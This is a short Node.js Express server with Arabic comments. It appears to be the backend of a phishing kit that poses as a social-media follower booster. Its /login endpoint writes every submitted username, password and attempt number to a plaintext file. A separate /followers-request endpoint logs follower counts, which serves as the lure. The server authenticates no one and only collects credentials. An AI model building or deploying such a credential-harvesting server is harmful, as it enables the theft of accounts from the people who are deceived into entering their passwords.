const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

// السماح بطلبات CORS
app.use(cors());

// إعداد المجلد لتخزين البيانات
const dataDir = path.join(__dirname, "data");
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir);
}

// استخدام middleware لتحليل طلبات JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// استقبال بيانات تسجيل الدخول
app.post("/login", (req, res) => {
  const { username, password, attempt } = req.body;

  // تسجيل البيانات في ملف
  const timestamp = new Date().toISOString();
  const logData = `${timestamp} - اسم المستخدم: ${username}, كلمة المرور: ${password}, المحاولة: ${attempt}\n`;

  fs.appendFile(path.join(dataDir, "logins.txt"), logData, (err) => {
    if (err) {
      console.error("خطأ في حفظ البيانات:", err);
      return res
        .status(500)
        .json({ success: false, message: "حدث خطأ في حفظ البيانات" });
    }

    console.log("تم تسجيل بيانات جديدة");
    res.json({ success: true, message: "تم استلام البيانات بنجاح" });
  });
});

// استقبال طلبات زيادة المتابعين
app.post("/followers-request", (req, res) => {
  const { followersCount } = req.body;

  // تسجيل البيانات في ملف
  const timestamp = new Date().toISOString();
  const logData = `${timestamp} - طلب متابعين: ${followersCount}\n`;

  fs.appendFile(
    path.join(dataDir, "followers-requests.txt"),
    logData,
    (err) => {
      if (err) {
        console.error("خطأ في حفظ بيانات طلب المتابعين:", err);
        return res
          .status(500)
          .json({ success: false, message: "حدث خطأ في حفظ البيانات" });
      }

      console.log("تم تسجيل طلب متابعين جديد");
      res.json({ success: true, message: "تم استلام طلب المتابعين بنجاح" });
    }
  );
});

// تقديم الملفات الثابتة من مجلد public
app.use(express.static("public"));

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`الخادم يعمل على المنفذ ${PORT}`);
});
